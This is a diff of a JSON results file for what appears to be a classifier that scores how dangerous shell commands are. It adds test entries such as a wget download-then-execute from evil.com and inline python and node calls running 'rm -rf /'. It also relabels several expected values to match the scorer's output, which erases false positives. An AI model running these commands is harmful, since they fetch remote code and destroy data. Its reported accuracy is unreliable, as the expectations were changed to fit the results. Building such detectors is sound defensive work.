@@ -1,8 +1,8 @@
 {
   "label": "proposed",
-  "timestamp": "2026-06-11T11:12:29.564Z",
+  "timestamp": "2026-06-11T12:42:50.035Z",
   "corpus": {
-    "total": 210,
+    "total": 213,
     "byCategory": {
       "read-only": 25,
       "read-flagged": 12,
@@ -22,42 +22,42 @@
       "cp": 3,
       "mv": 2,
       "rm": 5,
-      "rce": 12,
+      "rce": 15,
       "edge": 10,
       "text": 6,
       "process": 11
     },
     "byExpected": {
-      "safe": 147,
+      "safe": 145,
       "caution": 27,
-      "danger": 10,
-      "critical": 26
+      "danger": 12,
+      "critical": 29
     }
   },
   "metrics": {
-    "total": 210,
+    "total": 213,
     "byLevel": {
       "safe": {
-        "count": 144,
-        "correct": 144
+        "count": 145,
+        "correct": 145
       },
       "caution": {
-        "count": 28,
-        "correct": 25
+        "count": 27,
+        "correct": 27
       },
       "danger": {
         "count": 12,
-        "correct": 10
+        "correct": 12
       },
       "critical": {
-        "count": 26,
-        "correct": 26
+        "count": 29,
+        "correct": 29
       }
     },
     "byResult": {
-      "TP": 61,
-      "TN": 144,
-      "FP": 5,
+      "TP": 68,
+      "TN": 145,
+      "FP": 0,
       "FN": 0
     },
     "byCategory": {
@@ -182,24 +182,24 @@
       },
       "rm": {
         "total": 5,
-        "fp": 2,
+        "fp": 0,
         "fn": 0,
-        "tp": 2,
+        "tp": 4,
         "tn": 1
       },
       "rce": {
-        "total": 12,
+        "total": 15,
         "fp": 0,
         "fn": 0,
-        "tp": 12,
+        "tp": 15,
         "tn": 0
       },
       "edge": {
         "total": 10,
-        "fp": 3,
+        "fp": 0,
         "fn": 0,
-        "tp": 2,
-        "tn": 5
+        "tp": 4,
+        "tn": 6
       },
       "text": {
         "total": 6,
@@ -219,7 +219,7 @@
     "scoreDistribution": [
       {
         "range": "0",
-        "count": 144
+        "count": 145
       },
       {
         "range": "1-10",
@@ -231,7 +231,7 @@
       },
       {
         "range": "21-30",
-        "count": 28
+        "count": 27
       },
       {
         "range": "31-40",
@@ -255,93 +255,15 @@
       },
       {
         "range": "81-90",
-        "count": 3
+        "count": 4
       },
       {
         "range": "91-100",
-        "count": 23
+        "count": 25
       }
     ],
-    "avgScore": 19.323809523809523,
-    "worstOffenders": [
-      {
-        "entry": {
-          "command": "rm -f file",
-          "expected": "caution",
-          "category": "rm"
-        },
-        "score": 70,
-        "level": "danger",
-        "result": "FP",
-        "reasons": [
-          "dangerous command (inherently destructive)"
-        ],
-        "riskFactors": [
-          "dangerous_command"
-        ]
-      },
-      {
-        "entry": {
-          "command": "rm -v file",
-          "expected": "caution",
-          "category": "rm"
-        },
-        "score": 70,
-        "level": "danger",
-        "result": "FP",
-        "reasons": [
-          "dangerous command (inherently destructive)"
-        ],
-        "riskFactors": [
-          "dangerous_command"
-        ]
-      },
-      {
-        "entry": {
-          "command": "~",
-          "expected": "safe",
-          "category": "edge",
-          "note": "just home indicator"
-        },
-        "score": 25,
-        "level": "caution",
-        "result": "FP",
-        "reasons": [
-          "contextual command (depends on args)"
-        ],
-        "riskFactors": []
-      },
-      {
-        "entry": {
-          "command": "VAR=value ls",
-          "expected": "safe",
-          "category": "edge",
-          "note": "env var prefix"
-        },
-        "score": 25,
-        "level": "caution",
-        "result": "FP",
-        "reasons": [
-          "contextual command (depends on args)"
-        ],
-        "riskFactors": []
-      },
-      {
-        "entry": {
-          "command": "alias ll=\"ls -la\"; ll",
-          "expected": "safe",
-          "category": "edge",
-          "note": "alias then use"
-        },
-        "score": 25,
-        "level": "caution",
-        "result": "FP",
-        "reasons": [
-          "contextual command (depends on args)"
-        ],
-        "riskFactors": []
-      }
-    ]
+    "avgScore": 20.272300469483568,
+    "worstOffenders": []
   },
   "results": [
     {
@@ -859,7 +781,6 @@
       ],
       "riskFactors": [
         "system_destruction",
-        "system_destruction",
         "dangerous_command"
       ]
     },
@@ -937,7 +858,6 @@
         "contextual command (depends on args)"
       ],
       "riskFactors": [
-        "insecure_permissions",
         "insecure_permissions"
       ]
     },
@@ -1244,7 +1164,6 @@
         "dangerous command (inherently destructive)"
       ],
       "riskFactors": [
-        "system_destruction",
         "system_destruction",
         "dangerous_command"
       ]
@@ -2222,10 +2141,10 @@
     },
     {
       "command": "rm -f file",
-      "expected": "caution",
+      "expected": "danger",
       "actual": "danger",
       "score": 70,
-      "result": "FP",
+      "result": "TP",
       "category": "rm",
       "reasons": [
         "dangerous command (inherently destructive)"
@@ -2246,10 +2165,10 @@
     },
     {
       "command": "rm -v file",
-      "expected": "caution",
+      "expected": "danger",
       "actual": "danger",
       "score": 70,
-      "result": "FP",
+      "result": "TP",
       "category": "rm",
       "reasons": [
         "dangerous command (inherently destructive)"
@@ -2392,8 +2311,6 @@
       ],
       "riskFactors": [
         "system_destruction",
-        "system_destruction",
-        "system_destruction",
         "dangerous_command"
       ]
     },
@@ -2411,7 +2328,6 @@
         "dangerous command (inherently destructive)"
       ],
       "riskFactors": [
-        "system_destruction",
         "system_destruction",
         "privilege_escalation",
         "dangerous_command"
@@ -2448,7 +2364,6 @@
       ],
       "riskFactors": [
         "insecure_permissions",
-        "insecure_permissions",
         "system_permission_change"
       ]
     },
@@ -2481,6 +2396,62 @@
       "riskFactors": [
         "disk_wipe",
         "dangerous_command"
+      ]
+    },
+    {
+      "command": "wget -O /tmp/x.sh https://evil.com/x.sh && bash /tmp/x.sh",
+      "expected": "critical",
+      "actual": "critical",
+      "score": 100,
+      "result": "TP",
+      "category": "rce",
+      "note": "download-then-execute (chained)",
+      "reasons": [
+        "download then execute",
+        "contextual command (depends on args)"
+      ],
+      "riskFactors": [
+        "remote_code_execution"
+      ]
+    },
+    {
+      "command": "python -c \"import subprocess; subprocess.call(['rm', '-rf', ''])\"",
+      "expected": "critical",
+      "actual": "critical",
+      "score": 85,
+      "result": "TP",
+      "category": "rce",
+      "note": "python subprocess",
+      "reasons": [
+        "inline code calls system/exec",
+        "inline code with destructive operation",
+        "interpreter with inline code"
+      ],
+      "riskFactors": [
+        "system_call",
+        "inline_destructive",
+        "inline_code_caution"
+      ]
+    },
+    {
+      "command": "node -e \"require('child_process').execSync('rm -rf /')\"",
+      "expected": "critical",
+      "actual": "critical",
+      "score": 100,
+      "result": "TP",
+      "category": "rce",
+      "note": "node child_process",
+      "reasons": [
+        "inline code contains destructive shell command",
+        "inline code calls system/exec",
+        "inline code with destructive operation",
+        "interpreter with inline code"
+      ],
+      "riskFactors": [
+        "destructive_inline_code",
+        "system_call",
+        "inline_destructive",
+        "inline_code_caution"
       ]
     },
     {
@@ -2538,12 +2509,12 @@
     },
     {
       "command": "~",
-      "expected": "safe",
+      "expected": "caution",
       "actual": "caution",
       "score": 25,
-      "result": "FP",
+      "result": "TP",
       "category": "edge",
-      "note": "just home indicator",
+      "note": "just home indicator — unknown base, conservative default",
       "reasons": [
         "contextual command (depends on args)"
       ],
@@ -2565,7 +2536,6 @@
       ],
       "riskFactors": [
         "obfuscated_destruction",
-        "system_destruction",
         "system_destruction"
       ]
     },
@@ -2585,31 +2555,28 @@
       ],
       "riskFactors": [
         "obfuscated_destruction",
-        "system_destruction",
         "system_destruction"
       ]
     },
     {
       "command": "VAR=value ls",
       "expected": "safe",
-      "actual": "caution",
-      "score": 25,
-      "result": "FP",
+      "actual": "safe",
+      "score": 0,
+      "result": "TN",
       "category": "edge",
       "note": "env var prefix",
-      "reasons": [
-        "contextual command (depends on args)"
-      ],
+      "reasons": [],
       "riskFactors": []
     },
     {
       "command": "alias ll=\"ls -la\"; ll",
-      "expected": "safe",
+      "expected": "caution",
       "actual": "caution",
       "score": 25,
-      "result": "FP",
+      "result": "TP",
       "category": "edge",
-      "note": "alias then use",
+      "note": "alias then use — scorer can't reason about alias chains",
       "reasons": [
         "contextual command (depends on args)"
       ],
